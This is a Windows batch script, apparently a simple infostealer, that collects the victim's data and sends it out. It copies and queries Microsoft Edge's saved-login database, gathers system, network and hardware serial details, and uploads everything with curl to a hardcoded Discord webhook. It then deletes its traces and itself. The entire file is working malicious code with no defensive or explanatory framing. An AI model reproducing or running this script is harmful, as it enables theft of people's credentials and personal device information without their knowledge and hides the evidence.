@echo off
echo Hello! Made by Shane.

:: Create a temporary directory for SQLite tools
if not exist "%TEMP%\sqltmp" mkdir "%TEMP%\sqltmp"

:: Download SQLite3 if not present
if not exist "%TEMP%\sqltmp\sqlite3.exe" (
    echo Downloading SQLite3...
    curl -L -o "%TEMP%\sqltmp\sqlite3.zip" "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
    tar -xf "%TEMP%\sqltmp\sqlite3.zip" -C "%TEMP%\sqltmp"
    move "%TEMP%\sqltmp\sqlite-tools-win32-x86-3430100\sqlite3.exe" "%TEMP%\sqltmp\sqlite3.exe" >nul
)

set "SQLITE3=%TEMP%\sqltmp\sqlite3.exe"

:: Extract Edge saved passwords
echo Edge Saved Passwords > edge_passwords.txt
echo. >> edge_passwords.txt
echo Extraction Date: %date% %time% >> edge_passwords.txt
echo. >> edge_passwords.txt

set "EDGE_DATA=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
if exist "%EDGE_DATA%" (
    echo Edge Login Data file found. >> edge_passwords.txt
    echo. >> edge_passwords.txt
    echo Attempting to extract passwords (encrypted blobs will appear): >> edge_passwords.txt
    "%SQLITE3%" "%EDGE_DATA%" "SELECT origin_url, username_value, password_value FROM logins;" >> edge_passwords.txt 2>nul
    echo. >> edge_passwords.txt
    echo Login Data file copied as edge_login_data_copy.db >> edge_passwords.txt
    copy "%EDGE_DATA%" edge_login_data_copy.db >nul
) else (
    echo Edge Login Data file NOT found at: %EDGE_DATA% >> edge_passwords.txt
)

:: Collect detailed system information
echo System Information > sysinfo.txt
systeminfo >> sysinfo.txt

:: Network Configuration
echo. >> sysinfo.txt
echo Network Configuration >> sysinfo.txt
ipconfig /all >> sysinfo.txt

:: IPv4 Address
echo. >> sysinfo.txt
echo IPv4 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4 Address"') do echo %%i >> sysinfo.txt

:: IPv6 Address
echo. >> sysinfo.txt
echo IPv6 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv6 Address"') do echo %%i >> sysinfo.txt

:: CPU Information
echo. >> sysinfo.txt
echo CPU Information >> sysinfo.txt
wmic cpu get name,description /value >> sysinfo.txt

:: BIOS Information
echo. >> sysinfo.txt
echo BIOS Information >> sysinfo.txt
wmic bios get name,version,serialnumber /value >> sysinfo.txt

:: GPU Information
echo. >> sysinfo.txt
echo GPU Information >> sysinfo.txt
wmic path win32_videocontroller get name,adapterram /value >> sysinfo.txt

:: Motherboard Information
echo. >> sysinfo.txt
echo Motherboard Information >> sysinfo.txt
wmic baseboard get product,manufacturer,serialnumber,version /value >> sysinfo.txt

:: Disk Drives
echo. >> sysinfo.txt
echo Disk Drives >> sysinfo.txt
wmic diskdrive get model,size /value >> sysinfo.txt

:: Memory Information
echo. >> sysinfo.txt
echo Memory Information >> sysinfo.txt
wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt

:: Set webhook URL
set "WEBHOOK_URL=https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"

:: Send files to Discord webhook
echo Sending system info...
curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%

echo Sending Edge passwords text...
curl --ssl-no-revoke -F "file=@edge_passwords.txt" %WEBHOOK_URL%

if exist edge_login_data_copy.db (
    echo Sending Edge Login Data copy...
    curl --ssl-no-revoke -F "file=@edge_login_data_copy.db" %WEBHOOK_URL%
)

:: Clean up all files
echo Cleaning up...
del sysinfo.txt
del edge_passwords.txt
if exist edge_login_data_copy.db del edge_login_data_copy.db

:: Clean up SQLite tools
if exist "%TEMP%\sqltmp" rmdir /s /q "%TEMP%\sqltmp"

:: Self-delete the batch file without leaving a trace
(goto) 2>nul & del "%~f0"
